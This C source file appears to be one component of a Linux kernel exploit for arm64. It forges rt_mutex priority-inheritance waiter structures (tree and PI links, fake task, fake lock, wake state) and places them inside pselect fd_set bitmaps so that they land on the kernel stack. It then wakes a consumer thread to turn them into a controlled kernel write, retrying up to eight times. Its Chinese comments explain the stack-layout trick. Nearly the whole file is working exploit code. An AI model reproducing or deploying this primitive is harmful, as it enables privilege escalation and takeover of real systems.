#include "common.h"

#define PSELECT_ROUTE_ATTEMPTS 8

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = PSELECT_WAITER_WORD_SHIFT + waiter_word;
  if (!pselect_put_global_word(
          in, out, ex, words_per_set, global_word, value)) {
    pr_error("pselect cannot place %s waiter_word=%d global_word=%d\n",
             name, waiter_word, global_word);
  }
}

static void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_error("pselect F_DUPFD read errno=%d\n", errno);
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      SYSCHK(dup2(high_read, fd));
    }
  }
  close(high_read);
  SYSCHK(dup2(read_fd, PSELECT_ROUTE_NFDS - 1));
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

static void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  uintptr_t target = pselect_write_target();
  uintptr_t value = pselect_write_value();
  uintptr_t parent = value;
  uintptr_t right = 0;
  uintptr_t left = target;

  if (pselect_write_shape() == 1) {
    if (target < 8) {
      pr_error("shape1 target underflow target=%016zx\n", target);
    }
    parent = target - 8;
    right = value;
    left = 0;
  }

  struct waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {0, parent, "tree_parent"},
    {1, right, "tree_right"},
    {2, left, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {4, 0, "tree_deadline"},
    {5, parent, "pi_parent"},
    {6, right, "pi_right"},
    {7, left, "pi_left"},
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
    {10, fake_task, "task"},
    {11, fake_lock, "lock"},
    {12, 3, "wake_state"},
  };

  /* canoe shift=12：g12-14 使用 ex 输入集，g15-19 使用 res_in，
   * g20-24 使用 res_out。/dev/null 的就绪位使 res 与输入位图一致。 */
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    int g = PSELECT_WAITER_WORD_SHIFT + words[i].word;
    if (g >= 10 && g < 15) {
      fdset_put_word(ex, g - 10, words[i].value);
    } else if (g >= 15 && g < 20) {
      fdset_put_word(in, g - 15, words[i].value);
    } else if (g >= 20 && g < 25) {
      fdset_put_word(out, g - 20, words[i].value);
    } else {
      pr_error("pselect res cannot place %s waiter_word=%d global_word=%d\n",
               words[i].name, words[i].word, g);
    }
  }
}

static int pselect_res_install_readiness(
    const fd_set *in, const fd_set *out, const fd_set *ex) {
  struct rlimit rl = {32768, 32768};
  setrlimit(RLIMIT_NOFILE, &rl);

  int h_in = fcntl(1, F_DUPFD, 1100);
  int h_out = fcntl(2, F_DUPFD, 1100);
  int h_log = -1;
  if (g_sync_log_fd >= 0 && g_sync_log_fd < 400) {
    h_log = fcntl(g_sync_log_fd, F_DUPFD, 1000);
  }
  int null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
  if (null_fd < 0) {
    pr_error("pselect res open /dev/null errno=%d\n", errno);
    return 0;
  }

  int installed = 0;
  for (int k = 0; k < pselect_words_per_set(); k++) {
    unsigned long bits = fdset_get_word(in, k) |
                         fdset_get_word(out, k) | fdset_get_word(ex, k);
    while (bits) {
      int b = __builtin_ctzl(bits);
      bits &= bits - 1;
      SYSCHK(dup2(null_fd, 64 * k + b));
      installed++;
    }
  }
  if (h_in >= 0) {
    SYSCHK(dup2(h_in, 1));
    close(h_in);
  }
  if (h_out >= 0) {
    SYSCHK(dup2(h_out, 2));
    close(h_out);
  }
  if (h_log >= 0) {
    SYSCHK(dup2(h_log, g_sync_log_fd));
    close(h_log);
  }
  close(null_fd);
  return installed;
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_task) {
    pr_error("pselect route missing page=%016zx lock=%016zx task=%016zx\n",
             page_base, fake_lock, fake_task);
  }

  for (int attempt = 1; attempt <= PSELECT_ROUTE_ATTEMPTS; attempt++) {
    if (attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_task) {
        pr_error("pselect retry page prepare failed attempt=%d\n", attempt);
      }
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    g_sync_quiet = 0;
    pr_info("pselect res prepare attempt=%d page=%016zx target=%016zx value=%016zx\n",
            attempt, page_base, pselect_write_target(), pselect_write_value());
    g_sync_quiet = 1;
    int installed = pselect_res_install_readiness(&in, &out, &ex);
    g_sync_quiet = 0;
    pr_info("pselect res readiness attempt=%d installed=%d\n",
            attempt, installed);
    g_sync_quiet = 1;

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&main_route_delay_usec, 0);
    atomic_store(&punch_consume_go, 0);

    /* 先让 pselect 立即返回并生成 res_in/res_out，再唤醒 consumer。
     * 等待期间只执行用户态指令，保持内核栈上的 waiter 编码。 */
    struct timespec timeout = {
      .tv_sec = 0,
      .tv_nsec = 0,
    };
    errno = 0;
    g_sync_quiet = 1;
    int ret = pselect(
        PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, attempt);
    while (atomic_load(&punch_consume_go) != 0) {
      __asm__ volatile("yield" ::: "memory");
    }
    g_sync_quiet = 0;

    int calls = atomic_load(&consumer_calls);
    int success = atomic_load(&consumer_success);
    pr_info("pselect res attempt=%d ret=%d errno=%d calls=%d success=%d installed=%d\n",
            attempt, ret, saved_errno, calls, success, installed);

    if (calls > 0 && success > 0) {
      return;
    }
  }

  pr_error("pselect route exhausted\n");
}
